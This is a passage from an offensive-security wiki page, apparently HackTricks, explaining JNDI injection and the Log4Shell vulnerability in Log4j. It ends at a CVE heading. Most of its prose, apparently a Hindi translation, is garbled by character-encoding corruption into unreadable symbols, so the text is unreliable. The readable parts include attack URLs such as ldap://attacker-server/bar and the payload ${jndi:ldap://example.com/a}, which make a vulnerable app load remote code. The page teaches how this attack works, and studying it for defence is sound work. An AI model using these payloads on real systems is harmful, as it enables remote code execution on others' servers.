# JNDI - Java Naming and Directory Interface & Log4Shell

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

JNDI, рдЬреЛ 1990 рдХреЗ рджрд╢рдХ рдХреЗ рдЕрдВрдд рд╕реЗ Java рдореЗрдВ рдПрдХреАрдХреГрдд рд╣реИ, рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗрд╡рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ Java рдкреНрд░реЛрдЧреНрд░рд╛рдо рдбреЗрдЯрд╛ рдпрд╛ рд╡рд╕реНрддреБрдУрдВ рдХреЛ рдирд╛рдордХрд░рдг рдкреНрд░рдгрд╛рд▓реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдЗрдВрдЯрд░рдлреЗрд╕ (SPIs) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рд╕реЗ рдбреЗрдЯрд╛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рджреВрд░рд╕реНрде Java рд╡рд╕реНрддреБрдПрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рд╕рд╛рдорд╛рдиреНрдп SPIs рдореЗрдВ CORBA COS, Java RMI Registry, рдФрд░ LDAP рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

### JNDI Naming Reference

Java рд╡рд╕реНрддреБрдУрдВ рдХреЛ JNDI Naming References рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрдЧреНрд░рд╣реАрдд рдФрд░ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рджреЛ рд░реВрдкреЛрдВ рдореЗрдВ рдЖрддреЗ рд╣реИрдВ:

* **Reference Addresses**: рдПрдХ рд╡рд╕реНрддреБ рдХреЗ рд╕реНрдерд╛рди рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ (рдЬреИрд╕реЗ, _rmi://server/ref_), рдЬреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрддреЗ рд╕реЗ рд╕реАрдзреЗ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* **Remote Factory**: рдПрдХ рджреВрд░рд╕реНрде рдлреИрдХреНрдЯрд░реА рд╡рд░реНрдЧ рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИред рдЬрдм рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╡рд░реНрдЧ рдХреЛ рджреВрд░рд╕реНрде рд╕реНрдерд╛рди рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рдЗрдВрд╕реНрдЯреЗрдВрдЯрд┐рдПрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рддрдВрддреНрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рдкреНрд░рддрд┐рдХреВрд▓ рдЙрдкрд╛рдп рдХреЗ рд░реВрдк рдореЗрдВ:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ JDK 7u21 рд╕реЗ, рджреВрд░рд╕реНрде рд╡рд╕реНрддреБ рд▓реЛрдбрд┐рдВрдЧ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрдХ рдФрд░ рднреА рд╕реАрдорд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ JDK 6u141, 7u131, 8u121 рд╕реЗ, рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рд▓реЛрдб рдХреА рдЧрдИ Java рд╡рд╕реНрддреБрдУрдВ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдЗрд╕реЗ `true` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрдХ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХреЗ рдмрд┐рдирд╛ рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рд╕рдВрднрд╡ рд╣реИред
* **CORBA**: рдЗрд╕рдХрд╛ рдХреЛрдИ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЧреБрдг рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрдХ рд╣рдореЗрд╢рд╛ рд╕рдХреНрд░рд┐рдп рд░рд╣рддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, **Naming Manager**, рдЬреЛ JNDI рд▓рд┐рдВрдХ рдХреЛ рд╣рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реИ, рдореЗрдВ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рддрдВрддреНрд░ рдХреА рдХрдореА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХрд┐рд╕реА рднреА рд╕реНрд░реЛрдд рд╕реЗ рд╡рд╕реНрддреБрдУрдВ рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рдпрд╣ рдПрдХ рдЬреЛрдЦрд┐рдо рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ RMI, LDAP, рдФрд░ CORBA рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдордирдорд╛рдиреЗ Java рд╡рд╕реНрддреБрдУрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдпрд╛ рдореМрдЬреВрджрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдШрдЯрдХреЛрдВ (рдЧреИрдЬреЗрдЯреНрд╕) рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред

рджреБрд░реБрдкрдпреЛрдЧ рдпреЛрдЧреНрдп URL рдХреЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рдмрдиреА рд░рд╣рддреА рд╣реИрдВ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╕реНрд░реЛрддреЛрдВ рд╕реЗ JNDI рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдХреА рдХрдореА рдФрд░ рдореМрдЬреВрджрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХреЗ рдХрд╛рд░рдгред

### JNDI Example

![](<../../.gitbook/assets/image (1022).png>)

рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдпрджрд┐ рдЖрдкрдиреЗ **`PROVIDER_URL`** рд╕реЗрдЯ рдХрд┐рдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдПрдХ рд▓реБрдХрдЕрдк рдореЗрдВ рдПрдХ рдЕрд▓рдЧ URL рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛: `ctx.lookup("<attacker-controlled-url>")` рдФрд░ рдпрд╣реА рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ рд╡рд╣ рдЕрдкрдиреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреНрд░рдгрд╛рд▓реА рд╕реЗ рдордирдорд╛рдиреЗ рд╡рд╕реНрддреБрдУрдВ рдХреЛ рд▓реЛрдб рдХрд░ рд╕рдХреЗред

### CORBA Overview

CORBA (Common Object Request Broker Architecture) рдПрдХ **Interoperable Object Reference (IOR)** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рджреВрд░рд╕реНрде рд╡рд╕реНрддреБрдУрдВ рдХреА рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рди рдХреА рдЬрд╛ рд╕рдХреЗред рдпрд╣ рд╕рдВрджрд░реНрдн рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ:

* **Type ID**: рдПрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рд▓рд┐рдП рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ред
* **Codebase**: рд╕реНрдЯрдм рдХреНрд▓рд╛рд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП URLред

рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, CORBA рд╕реНрд╡рд╛рднрд╛рд╡рд┐рдХ рд░реВрдк рд╕реЗ рдХрдордЬреЛрд░ рдирд╣реАрдВ рд╣реИред рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдорддреМрд░ рдкрд░ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ:

* рдПрдХ **рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрдХ** рдХреА рд╕реНрдерд╛рдкрдирд╛ред
* рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрдХ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдбрдмреЗрд╕ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ред рдпрд╣ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
* рд╕реЙрдХреЗрдЯ рдЕрдиреБрдорддрд┐, рдЬреИрд╕реЗ, `permissions java.net.SocketPermission "*:1098-1099", "connect";`ред
* рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐, рдпрд╛ рддреЛ рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ рд░реВрдк рд╕реЗ (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) рдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЬрд╣рд╛рдВ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдлрд╝рд╛рдЗрд▓реЗрдВ рд░рдЦреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ рд╡рд┐рдХреНрд░реЗрддрд╛ рдиреАрддрд┐рдпрд╛рдБ рд▓рдЪреАрд▓реА рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдФрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЗрди рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреА рд╣реИрдВред

### RMI Context

RMI (Remote Method Invocation) рдХреЗ рд▓рд┐рдП, рд╕реНрдерд┐рддрд┐ рдХреБрдЫ рд╣рдж рддрдХ рдЕрд▓рдЧ рд╣реИред CORBA рдХреА рддрд░рд╣, рдордирдорд╛рдиреЗ рдХреНрд▓рд╛рд╕ рдбрд╛рдЙрдирд▓реЛрдбрд┐рдВрдЧ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реИред RMI рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХрд┐рд╕реА рдХреЛ рдЖрдорддреМрд░ рдкрд░ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрдХ рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдЬреЛ CORBA рдореЗрдВ рднреА рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╣реИред

### LDAP

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдореЗрдВ **Search** рдФрд░ **Lookup** рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред\
рдПрдХ **search** рдПрдХ URL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рдЬреИрд╕реЗ `ldap://localhost:389/o=JNDITutorial` JNDITutorial рд╡рд╕реНрддреБ рдХреЛ LDAP рд╕рд░реНрд╡рд░ рд╕реЗ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ **рдЗрд╕рдХреЗ рдЧреБрдгреЛрдВ рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**ред\
рдПрдХ **lookup** рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп **рдирд╛рдордХрд░рдг рд╕реЗрд╡рд╛рдУрдВ** рдХреЗ рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдо **рдЬреЛ рдХреБрдЫ рднреА рдПрдХ рдирд╛рдо рд╕реЗ рдмрдВрдзрд╛ рд╣реИ** рдЙрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

рдпрджрд┐ LDAP рдЦреЛрдЬ рдХреЛ **SearchControls.setReturningObjFlag() рдХреЗ рд╕рд╛рде `true` рдХреЗ рд╕рд╛рде рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рддреЛ рд▓реМрдЯрд╛рдИ рдЧрдИ рд╡рд╕реНрддреБ рдХреЛ рдкреБрдирд░реНрдирд┐рд░реНрдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

рдЗрд╕рд▓рд┐рдП, рдЗрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВред\
рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ LDAP рд░рд┐рдХреЙрд░реНрдб рдХреЛ рдЬрд╝рд╣рд░ рджреЗ рд╕рдХрддрд╛ рд╣реИ, рдЙрди рдкрд░ рдкреЗрд▓реЛрдб рдкреЗрд╢ рдХрд░рдХреЗ** рдЬреЛ рдЙрди рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдВрдЧреЗ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдЗрдХрдЯреНрдард╛ рдХрд░рддреА рд╣реИрдВ (рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ LDAP рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ рддреЛ **рджрд░реНрдЬрдиреЛрдВ рдорд╢реАрдиреЛрдВ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА** рд╣реИ)ред рдЗрд╕рдХреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдпрд╣ рд╣реЛрдЧрд╛ рдХрд┐ рдПрдХ **MitM рд╣рдорд▓реЗ рдХреЛ LDAP рдЦреЛрдЬ рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рдП** рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдПред

рдпрджрд┐ рдЖрдк **рдПрдХ рдРрдк рдХреЛ JNDI LDAP URL рд╣рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдЙрд╕ LDAP рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЦреЛрдЬрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ рдЖрдк рджреБрд░реБрдкрдпреЛрдЧ рд╡рд╛рдкрд╕ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ (log4shell)ред

#### Deserialization exploit

![](<../../.gitbook/assets/image (275).png>)

**рджреБрд░реБрдкрдпреЛрдЧ рдХреЛ рдЕрдиреБрдХреНрд░рдорд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рдФрд░ рдЗрд╕реЗ рдкреБрдирдГ рдЕрдиреБрдХреНрд░рдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдпрджрд┐ `trustURLCodebase` `true` рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛрдбрдмреЗрд╕ рдореЗрдВ рдЕрдкрдиреА рдХрдХреНрд╖рд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рдЙрд╕реЗ рдХреНрд▓рд╛рд╕рдкрд╛рде рдореЗрдВ рдЧреИрдЬреЗрдЯреНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

#### JNDI Reference exploit

рдЗрд╕ LDAP рдкрд░ **JavaFactory рд╕рдВрджрд░реНрднреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд▓рд╛ рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реИ:

![](<../../.gitbook/assets/image (1059).png>)

## Log4Shell Vulnerability

рдпрд╣ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ Log4j рдореЗрдВ рдкреЗрд╢ рдХреА рдЧрдИ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ [**рд╡рд┐рд╢реЗрд╖ рд╕рд┐рдВрдЯреИрдХреНрд╕**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдЬреЛ `${prefix:name}` рдХреЗ рд░реВрдк рдореЗрдВ рд╣реИ рдЬрд╣рд╛рдВ `prefix` рд╡рд┐рднрд┐рдиреНрди [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИ рдЬрд╣рд╛рдВ `name` рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `${java:version}` рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЪрд▓ рд░рд╣реА Java рдХрд╛ рд╕рдВрд╕реНрдХрд░рдг рд╣реИред

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) рдиреЗ `jndi` рд▓реБрдХрдЕрдк рд╕реБрд╡рд┐рдзрд╛ рдкреЗрд╢ рдХреАред рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ JNDI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЪрд░ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЖрдорддреМрд░ рдкрд░, рдХреБрдВрдЬреА рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ `java:comp/env/` рдХреЗ рд╕рд╛рде рдкреВрд░реНрд╡рд╡рд░реНрддреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрджрд┐ рдХреБрдВрдЬреА рдореЗрдВ рд╕реНрд╡рдпрдВ **":"** рд╢рд╛рдорд┐рд▓ рд╣реИ, рддреЛ рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреВрд░реНрд╡рд╡рд░реНрддреА рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред

рдХреБрдВрдЬреА рдореЗрдВ **: рдЙрдкрд╕реНрдерд┐рдд** рд╣реЛрдиреЗ рдкрд░, рдЬреИрд╕реЗ `${jndi:ldap://example.com/a}` рдореЗрдВ рдХреЛрдИ **рдкреВрд░реНрд╡рд╡рд░реНрддреА рдирд╣реАрдВ рд╣реИ** рдФрд░ **LDAP рд╕рд░реНрд╡рд░ рд╡рд╕реНрддреБ рдХреЗ рд▓рд┐рдП рдХреНрд╡реЗрд░реА рдХреА рдЬрд╛рддреА рд╣реИ**ред рдФрд░ рдпреЗ рд▓реБрдХрдЕрдк Log4j рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдФрд░ рдЬрдм рдкрдВрдХреНрддрд┐рдпрд╛рдБ рд▓реЙрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ, рджреЛрдиреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рд▓рд┐рдП, RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдПрдХ рдЪреАрдЬрд╝ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдПрдХ **рдХрдордЬреЛрд░ Log4j рд╕рдВрд╕реНрдХрд░рдг рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд░рддрд╛ рд╣реИ**ред рдФрд░ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╣реИ рдЬреЛ Java рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЬрд╛рдирдХрд╛рд░реА рд▓реЙрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЗрдВрдЯрд░рдиреЗрдЯ рдХреЗ рд╕рд╛рдордиреЗ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рд╕рд╣рд┐рдд), рдпрд╣ рдмрд╣реБрдд рд╕рд╛рдорд╛рдиреНрдп рдерд╛ рдХрд┐ log4j HTTP рд╣реЗрдбрд░ рдЬреИрд╕реЗ User-Agent рдХреЛ рд▓реЙрдЧ рдХрд░рддрд╛ рдерд╛ред рд╣рд╛рд▓рд╛рдБрдХрд┐, log4j **рдХреЗрд╡рд▓ HTTP рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд▓реЙрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдмрд▓реНрдХрд┐ рдХрд┐рд╕реА рднреА рдЗрдирдкреБрдЯ** рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рд▓реЙрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдбреЗрд╡рд▓рдкрд░ рдиреЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ред

## Overview of Log4Shell-Related CVEs

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critical]**

